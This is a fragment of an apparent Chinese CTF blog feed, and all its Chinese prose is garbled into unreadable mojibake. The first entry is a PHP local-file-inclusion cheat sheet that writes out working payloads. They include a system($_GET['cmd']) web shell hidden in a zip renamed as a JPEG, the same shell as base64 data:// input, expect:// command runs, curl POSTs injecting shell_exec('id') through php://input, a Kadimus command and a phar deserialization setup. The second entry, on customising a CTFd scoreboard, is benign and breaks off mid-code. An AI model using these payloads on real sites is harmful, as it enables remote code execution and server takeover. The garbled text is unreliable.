id="Wrapper-zip-x2F-x2F"><a href="#Wrapper-zip-x2F-x2F" class="headerlink" title="Wrapper zip:&#x2F;&#x2F;"></a>Wrapper zip:&#x2F;&#x2F;</h2><p>è¯¦ç»†æ–‡æ¡£ <a href="https://www.php.net/manual/en/wrappers.compression.php">åœ¨è¿™</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;&lt;pre&gt;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;  <br>zip payload.zip payload.php;<br>mv payload.zip shell.jpg;<br>rm payload.php<br><br>http://52hertz.tech/index.php?page=zip://shell.jpg%23payload.php<br></code></pre></td></tr></table></figure><h2 id="Wrapper-data-x2F-x2F"><a href="#Wrapper-data-x2F-x2F" class="headerlink" title="Wrapper data:&#x2F;&#x2F;"></a>Wrapper data:&#x2F;&#x2F;</h2><p>è¯¦ç»†æ–‡æ¡£ <a href="https://www.php.net/manual/en/wrappers.data.php">åœ¨è¿™</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=<br>//NOTE: the payload <span class="hljs-keyword">is</span> <span class="hljs-string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);echo &#x27;Shell done !&#x27;; ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰è¿™ä¸ªç©æ„ï¼š</p><blockquote><p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://52hertz.tech/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p></blockquote><h2 id="Wrapper-expect-x2F-x2F"><a href="#Wrapper-expect-x2F-x2F" class="headerlink" title="Wrapper expect:&#x2F;&#x2F;"></a>Wrapper expect:&#x2F;&#x2F;</h2><p>è¯¦ç»†æ–‡æ¡£ <a href="https://www.php.net/manual/en/wrappers.expect.php">åœ¨è¿™</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://example.com/index.php?page=expect://<span class="hljs-built_in">id</span><br>http://example.com/index.php?page=expect://ls<br></code></pre></td></tr></table></figure><h2 id="Wrapper-input-x2F-x2F"><a href="#Wrapper-input-x2F-x2F" class="headerlink" title="Wrapper input:&#x2F;&#x2F;"></a>Wrapper input:&#x2F;&#x2F;</h2><p>è¿™ä¸ªåœ¨CTFä¸€äº›åŸºç¡€çš„phpé¢˜é‡Œé¢ç»å¸¸ä¼šç¢°åˆ°ï¼Œå½“ä»£ç é‡Œå«æœ‰ <code>file_get_contents($var,&#39;r&#39;)</code> è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œè¿™ä¸ªå˜é‡æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›æ¯”å¯¹éªŒè¯ã€‚</p><p>ä½¿ç”¨æ–¹å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¾‹å¦‚ï¼š<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$var</span>,<span class="hljs-string">&#x27;r&#x27;</span>) === <span class="hljs-string">&#x27;admin&#x27;</span>)<br>url: <span class="hljs-string">&quot;https://52hertz.tech/index.php?var=php://input&quot;</span><br><span class="hljs-comment">// ç„¶ååŒæ—¶ POST æ•°æ® &#x27;admin&#x27;ï¼Œè¿™æ ·$varçš„å€¼å°±æ˜¯ admin äº†</span><br></code></pre></td></tr></table></figure><p>Noteï¼š<code>enctype=&quot;multipart/form-data&quot;</code> çš„æ—¶å€™ <code> php://input</code> æ˜¯æ— æ•ˆçš„ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ <code>curl</code> å‘½ä»¤æ¥å®ç°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X POST --data &quot;admin&quot; &quot;https://52hertz.tech/index.php?var=php://input&quot;<br>curl -X POST --data &quot;&lt;?php echo shell_exec(&#x27;id&#x27;); ?&gt;&quot; &quot;https://52hertz.tech/index.php?page=php://input%00&quot; -k -v<br></code></pre></td></tr></table></figure><p>å¦å¤–ï¼ŒKadimuså…·æœ‰è‡ªåŠ¨æ‰§è¡Œæ­¤æ”»å‡»çš„æ¨¡å—ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kadimus -u &quot;https://52hertz.tech/index.php?page=php://input%00&quot;  -C &#x27;&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;&#x27; -T input<br></code></pre></td></tr></table></figure><h2 id="Wrapper-phar-x2F-x2F"><a href="#Wrapper-phar-x2F-x2F" class="headerlink" title="Wrapper phar:&#x2F;&#x2F;"></a>Wrapper phar:&#x2F;&#x2F;</h2><p>å…³äº <code>phar://</code> çš„è¯¦ç»†æ–‡æ¡£ <a href="https://www.php.net/manual/en/wrappers.phar.php">åœ¨è¿™</a>ï¼Œæˆ–è€…å‚çœ‹å¦ä¸€ç¯‡ <a href="">åšå®¢</a></p><p>åˆ›å»ºä¸€ä¸ª <code>meta-data</code> å¸¦æœ‰åºåˆ—åŒ–å¯¹è±¡çš„ phar æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// create new Phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><br><span class="hljs-comment">// add object of any class as meta data</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>;<br><span class="hljs-variable">$object</span>-&gt;data = <span class="hljs-string">&#x27;rips&#x27;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>å¦‚æœç°åœ¨é€šè¿‡ <code>phar://</code> åŒ…è£…å™¨å¯¹æˆ‘ä»¬ç°æœ‰çš„ <code>phar</code> æ–‡ä»¶æ‰§è¡Œæ–‡ä»¶æ“ä½œï¼Œåˆ™å…¶åºåˆ—åŒ–çš„å…ƒæ•°æ®å°†è¢«ååºåˆ—åŒ–ã€‚ å¦‚æœæ­¤åº”ç”¨ç¨‹åºæœ‰ä¸€ä¸ªåä¸ºAnyClassçš„ç±»ï¼Œå¹¶ä¸”å®šä¹‰äº†é­”æœ¯æ–¹æ³•<code>__destruct()</code>æˆ–<code>__wakeup()</code>ï¼Œåˆ™å°†è‡ªåŠ¨è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// output: rips</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;phar://test.phar&#x27;</span>);<br></code></pre></td></tr></table></figure><p>Note: åœ¨ä»»ä½•æ–‡ä»¶æ“ä½œï¼Œ<code>file_exists</code> ç­‰ä¸­ï¼Œéƒ½ä¼šä¸º<code> phar://</code>è§¦å‘ååºåˆ—åŒ–ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFdå¹³å°é’ˆå¯¹æ ¡èµ›çš„äºŒæ¬¡å¼€å‘</title>
    <link href="/2020/03/15/CTFd_second_develop/"/>
    <url>/2020/03/15/CTFd_second_develop/</url>
    
    <content type="html"><![CDATA[<h1 id="å¢åŠ å­¦å·å±æ€§"><a href="#å¢åŠ å­¦å·å±æ€§" class="headerlink" title="å¢åŠ å­¦å·å±æ€§"></a>å¢åŠ å­¦å·å±æ€§</h1><h3 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h3><p>åœ¨ <code>sqlite</code> æ•°æ®åº“ï¼Œä¹Ÿå°±æ˜¯ <code>ctf.db</code> çš„æ–‡ä»¶é‡Œï¼Œæ·»åŠ ä¸€ä¸ªåˆ—åä¸º <code>sid</code> çš„å­—æ®µï¼š</p><p>æˆ‘æ˜¯ç”¨å›¾å½¢ç®¡ç†å·¥å…·æ·»åŠ çš„ï¼Œå‘½ä»¤çš„è¯å‚è€ƒï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> users <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> sid <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">default</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><ol><li>å­—æ®µéœ€è¦è®¾ç½®é»˜è®¤å€¼ï¼Œä¸ç„¶ flask ä¼šæŠ¥é”™</li><li>å­—æ®µä½ç½®ä¸èƒ½åœ¨ä¸­é—´çš„æŸä¸ªä½ç½®ï¼Œåªèƒ½æ”¾ç½®åœ¨æœ€åé¢ï¼ˆé»˜è®¤æ˜¯æœ€åï¼‰</li></ol><h3 id="html-æ–‡ä»¶é…ç½®"><a href="#html-æ–‡ä»¶é…ç½®" class="headerlink" title="html æ–‡ä»¶é…ç½®"></a>html æ–‡ä»¶é…ç½®</h3><p>åœ¨ <code>/CTFd/CTFd/themes/core/templates/register.html</code> ä¸­æ·»åŠ  html è¡¨å•æ•°æ®ï¼Œè¿™é‡Œä¸»è¦æ˜¯æ³¨æ„ name çš„å€¼ï¼Œå› ä¸ºæ˜¯ html çš„ form è¡¨å•ä½¿ç”¨è¿™ä¸ªå­—æ®µåæ¥å–å€¼</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnn2V.png" alt="8tnn2V.png"></p><h3 id="auth-py-æ–‡ä»¶é…ç½®"><a href="#auth-py-æ–‡ä»¶é…ç½®" class="headerlink" title="auth.py æ–‡ä»¶é…ç½®"></a>auth.py æ–‡ä»¶é…ç½®</h3><p>åœ¨ <code>/CTFd/CTFd/auth.py</code> ä¸­çš„ register å‡½æ•°ä¸­æ·»åŠ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sid = Users.query.add_columns(<span class="hljs-string">&#x27;sid&#x27;</span>,<span class="hljs-string">&#x27;id&#x27;</span>).filter_by(sid=request.form[<span class="hljs-string">&#x27;sid&#x27;</span>]).first()<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/17/8tnMKU.png" alt="8tnMKU.png"></p><p>ç”¨ <code>sid = request.form.get(&quot;sid&quot;, &quot;&quot;).strip()</code> å–å­¦å·ï¼Œç„¶ååœ¨ <code>validators</code> é‡Œå†™ä¸€ä¸ªéªŒè¯å­¦å·æ ¼å¼çš„å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_sid</span>(<span class="hljs-params">sid</span>):<br>    <span class="hljs-keyword">if</span> sid == <span class="hljs-string">&quot;wctf2020&quot;</span>: <span class="hljs-comment"># é’ˆå¯¹æ ¡å¤–</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(sid) == <span class="hljs-number">12</span> <span class="hljs-keyword">and</span> sid.isdigit() <span class="hljs-keyword">and</span> sid.startswith(<span class="hljs-string">&quot;201&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°ä½ç½®ï¼š<code>/CTFd/CTFd/utils/validators/__init__.py</code></p><p>æ¥ç€è¿˜æ˜¯åœ¨ <code>auth.py</code> ï¼Œåˆ›å»ºç”¨æˆ·çš„æ—¶å€™å†™ä¸Š <code>sid</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tneCq.png" alt="8tneCq.png"></p><h3 id="models-ç±»ä¸­çš„é…ç½®"><a href="#models-ç±»ä¸­çš„é…ç½®" class="headerlink" title="models ç±»ä¸­çš„é…ç½®"></a>models ç±»ä¸­çš„é…ç½®</h3><p>åœ¨ <code>/CTFd/CTFd/models/__init__.py</code> ä¸­çš„ Users ç±»ä¸­æ·»åŠ ä¸€ä¸ªè¡¨å•åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sid = db.Column(db.String(<span class="hljs-number">20</span>))<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/17/8tnuvT.png" alt="8tnuvT.png"></p><h3 id="adminé¢æ¿ä¸­usersçš„å­¦å·æ˜¾ç¤º"><a href="#adminé¢æ¿ä¸­usersçš„å­¦å·æ˜¾ç¤º" class="headerlink" title="adminé¢æ¿ä¸­usersçš„å­¦å·æ˜¾ç¤º"></a>adminé¢æ¿ä¸­usersçš„å­¦å·æ˜¾ç¤º</h3><p>æ–‡ä»¶åœ°å€ <code>/CTFd/CTFd/themes/admin/templates/users/users.html</code></p><p>è¿™é‡ŒæŠŠå›½å®¶çš„ä¸€åˆ—ç”¨æ¥æ˜¾ç¤ºå­¦å·</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnQrF.png" alt="8tnQrF.png"></p><p>åœ¨è¿‡æ»¤çš„ä¸‹æ‹‰æ¡†å¢åŠ å­¦å·çš„æœç´¢é€‰é¡¹ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnm80.png" alt="8tnm80.png"></p><p>ç„¶ååœ¨è¡¨ä¸­è¾“å‡ºå­¦å·ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnlb4.png" alt="8tnlb4.png"></p><p>æ•ˆæœ</p><p><img src="https://s1.ax1x.com/2020/03/17/8tn3VJ.png" alt="8tn3VJ.png"></p><h1 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h1><h3 id="æ ¡å†…å¤–åˆ†ç±»"><a href="#æ ¡å†…å¤–åˆ†ç±»" class="headerlink" title="æ ¡å†…å¤–åˆ†ç±»"></a>æ ¡å†…å¤–åˆ†ç±»</h3><p>åŸºäºå­¦å·æ¥è¿›è¡Œåˆ†ç±»ï¼Œé¦–å…ˆåœ¨ <code>/CTFd/CTFd/themes/core/templates/scoreboard.html</code> å¢åŠ ä¸‹æ‹‰æ¡†ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select w-10&quot;</span> <span class="hljs-attr">onchange</span>=<span class="hljs-string">&quot;top.location.href=this.value&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>æ’åæ–¹å¼<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/scoreboard&quot;</span>&gt;</span>æ€»æ’å<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/scoreboard/1&quot;</span>&gt;</span>æ ¡å†…æ’å<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/scoreboard/2&quot;</span>&gt;</span>æ ¡å¤–æ’å<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ›´æ”¹ <code>/CTFd/utils/scores/__init__.py</code> é‡Œçš„ <code>get_standings</code> æŸ¥è¯¢æ–¹å¼ï¼š</p><h4 id="å¢åŠ å‚æ•°"><a href="#å¢åŠ å‚æ•°" class="headerlink" title="å¢åŠ å‚æ•°"></a>å¢åŠ å‚æ•°</h4><p><img src="https://s1.ax1x.com/2020/03/17/8tn8a9.png" alt="8tn8a9.png"></p><h4 id="åˆ†æƒ…å†µæŸ¥è¯¢"><a href="#åˆ†æƒ…å†µæŸ¥è¯¢" class="headerlink" title="åˆ†æƒ…å†µæŸ¥è¯¢"></a>åˆ†æƒ…å†µæŸ¥è¯¢</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> request == <span class="hljs-string">&quot;total&quot;</span>:<br>            standings_query = (<br>                db.session.query(<br>                    Model.<span class="hljs-built_in">id</span>.label(<span class="hljs-string">&quot;account_id&quot;</span>),<br>                    Model.oauth_id.label(<span class="hljs-string">&quot;oauth_id&quot;</span>),<br>                    Model.name.label(<span class="hljs-string">&quot;name&quot;</span>),<br>                    sumscores.columns.score,<br>                )<br>                .join(sumscores, Model.<span class="hljs-built_in">id</span> == sumscores.columns.account_id)<br>                .<span class="hljs-built_in">filter</span>(Model.banned == <span class="hljs-literal">False</span>, Model.hidden == <span class="hljs-literal">False</span>)<br>                .order_by(sumscores.columns.score.desc(), sumscores.columns.<span class="hljs-built_in">id</span>)<br>            )<br>        <span class="hljs-keyword">elif</span> request == <span class="hljs-string">&quot;wust&quot;</span>:<br>            standings_query = (<br>                db.session.query(<br>                    Model.<span class="hljs-built_in">id</span>.label(<span class="hljs-string">&quot;account_id&quot;</span>),<br>                    Model.oauth_id.label(<span class="hljs-string">&quot;oauth_id&quot;</span>),<br>                    Model.name.label(<span class="hljs-string">&quot;name&quot;</span>),<br>                    sumscores.columns.score,<br>                )<br>                    .join(sumscores, Model.<span class="hljs-built_in">id</span> == sumscores.columns.account_id)<br>                    .<span class="hljs-built_in">filter</span>(Model.banned == <span class="hljs-literal">False</span>, Model.hidden == <span class="hljs-literal">False</span>, Model.sid != <span class="hljs-string">&quot;wctf2020&quot;</span>)<br>                    .order_by(sumscores.columns.score.desc(), sumscores.columns.<span class="hljs-built_in">id</span>)<br>            )<br>        <span class="hljs-keyword">elif</span> request == <span class="hljs-string">&quot;others&quot;</span>:<br>            standings_query = (<br>                db.session.query(<br>                    Model.<span class="hljs-built_in">id</span>.label(<span class="hljs-string">&quot;account_id&quot;</span>),<br>                    Model.oauth_id.label(<span class="hljs-string">&quot;oauth_id&quot;</span>),<br>                    Model.name.label(<span class="hljs-string">&quot;name&quot;</span>),<br>                    sumscores.columns.score,<br>                )<br>                    .join(sumscores, Model.<span class="hljs-built_in">id</span> == sumscores.columns.account_id)<br>                    .<span class="hljs-built_in">filter</span>(Model.banned == <span class="hljs-literal">False</span>, Model.hidden == <span class="hljs-literal">False</span>, Model.sid == <span class="hljs-string">&quot;wctf2020&quot;</span>)<br>                    .order_by(sumscores.columns.score.desc(), sumscores.columns.<span class="hljs-built_in">id</span>)<br>            )<br></code></pre></td></tr></table></figure><p>é»˜è®¤æ˜¯æ€»æ¦œ(0)ï¼Œ1ä¸ºæ ¡å†…ï¼Œ2ä¸ºæ ¡å¤–ã€‚</p><p>ç„¶ååœ¨ <code>/CTFd/scoreboard.py</code> æ·»åŠ è·¯ç”±ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@scoreboard.route(<span class="hljs-params"><span class="hljs-string">&quot;/scoreboard&quot;</span></span>)</span><br><span class="hljs-meta">@check_score_visibility</span><br><span class="hljs-meta">@cache.cached(<span class="hljs-params">timeout=<span class="hljs-number">60</span>, key_prefix=make_cache_key</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listing</span>():<br>    standings = get_standings(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, request=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> render_template(<br>        <span class="hljs-string">&quot;scoreboard.html&quot;</span>,<br>        standings=standings,<br>        score_frozen=config.is_scoreboard_frozen(),<br>    )<br><br><span class="hljs-meta">@scoreboard.route(<span class="hljs-params"><span class="hljs-string">&quot;/scoreboard/1&quot;</span></span>)</span><br><span class="hljs-meta">@check_score_visibility</span><br><span class="hljs-meta">@cache.cached(<span class="hljs-params">timeout=<span class="hljs-number">60</span>, key_prefix=make_cache_key</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listing1</span>():<br>    standings = get_standings(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, request=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> render_template(<br>        <span class="hljs-string">&quot;scoreboard.html&quot;</span>,<br>        standings=standings,<br>        score_frozen=config.is_scoreboard_frozen(),<br>    )<br><br><span class="hljs-meta">@scoreboard.route(<span class="hljs-params"><span class="hljs-string">&quot;/scoreboard/2&quot;</span></span>)</span><br><span class="hljs-meta">@check_score_visibility</span><br><span class="hljs-meta">@cache.cached(<span class="hljs-params">timeout=<span class="hljs-number">60</span>, key_prefix=make_cache_key</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listing2</span>():<br>    standings = get_standings(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, request=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> render_template(<br>        <span class="hljs-string">&quot;scoreboard.html&quot;</span>,<br>        standings=standings,<br>        score_frozen=config.is_scoreboard_frozen(),<br>    )<br></code></pre></td></tr></table></figure><h4 id="è®¡åˆ†æ¿å›¾è¡¨"><a href="#è®¡åˆ†æ¿å›¾è¡¨" class="headerlink" title="è®¡åˆ†æ¿å›¾è¡¨"></a>è®¡åˆ†æ¿å›¾è¡¨</h4><p><code>/CTFd/CTFd/api/v1/scoreboard.py</code>ï¼Œå¯¹æ¥å£è¯·æ±‚æ—¶çš„ url è¿›è¡Œåˆ†ç±»ï¼Œå…ˆæ·»åŠ  <code>request</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br></code></pre></td></tr></table></figure><p>ç„¶åå¯¹æ¥å£ <code>@scoreboard_namespace.route(&quot;/top/&lt;count&gt;&quot;)</code> é‡Œè¿›è¡Œä¿®æ”¹ï¼Œæ·»åŠ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/scoreboard/1&quot;</span> <span class="hljs-keyword">in</span> request.headers[<span class="hljs-string">&#x27;Referer&#x27;</span>]:<br>           board_type = <span class="hljs-number">1</span><br>       <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;/scoreboard/2&quot;</span> <span class="hljs-keyword">in</span> request.headers[<span class="hljs-string">&#x27;Referer&#x27;</span>]:<br>           board_type = <span class="hljs-number">2</span><br>       <span class="hljs-keyword">else</span>:<br>           board_type = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°† <code>get_standings</code> çš„å‚æ•°æ”¹æˆ <code>standings = get_standings(count=count, request=board_type)</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tnG5R.png" alt="8tnG5R.png"></p><h1 id="å‰ä¸‰è¡€è‡ªåŠ¨æ’­æŠ¥"><a href="#å‰ä¸‰è¡€è‡ªåŠ¨æ’­æŠ¥" class="headerlink" title="å‰ä¸‰è¡€è‡ªåŠ¨æ’­æŠ¥"></a>å‰ä¸‰è¡€è‡ªåŠ¨æ’­æŠ¥</h1><p><code>/CTFd/CTFd/api/v1/challenges.py</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tnYP1.png" alt="8tnYP1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># auto-broadcast</span><br><span class="hljs-keyword">if</span> app.config[<span class="hljs-string">&#x27;AUTO_BROADCAST&#x27;</span>]:<br>solve_count = Solves.query.filter_by(challenge_id=challenge_id).count()<br>blood_number = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> solve_count == <span class="hljs-number">1</span>:<br>blood_number = <span class="hljs-string">&quot;first&quot;</span><br> <span class="hljs-keyword">elif</span> solve_count == <span 